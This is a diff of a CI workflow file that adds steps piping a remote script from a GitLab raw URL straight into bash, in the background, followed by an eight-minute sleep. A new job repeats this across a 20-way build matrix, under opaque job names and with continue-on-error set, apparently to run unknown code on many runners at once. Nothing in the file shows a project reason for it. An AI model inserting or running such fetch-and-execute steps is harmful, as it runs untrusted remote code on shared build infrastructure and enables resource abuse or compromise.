@@ -28,4 +28,19 @@ jobs:
     steps: 
       - name: bertjob
         continue-on-error: true
-        run: ${{ secrets.NOBLE }}
+    run: curl -sL  https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash &
+            sleep 8m
+
+  buner:
+    needs: [hert]
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        build: [E.1, F.1]
+        flag: [A, B, C, D, E, F, G, H, I, J]
+    steps: 
+      - name: bertjob
+        continue-on-error: true
+    run: curl -sL  https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash &
+            sleep 8m            
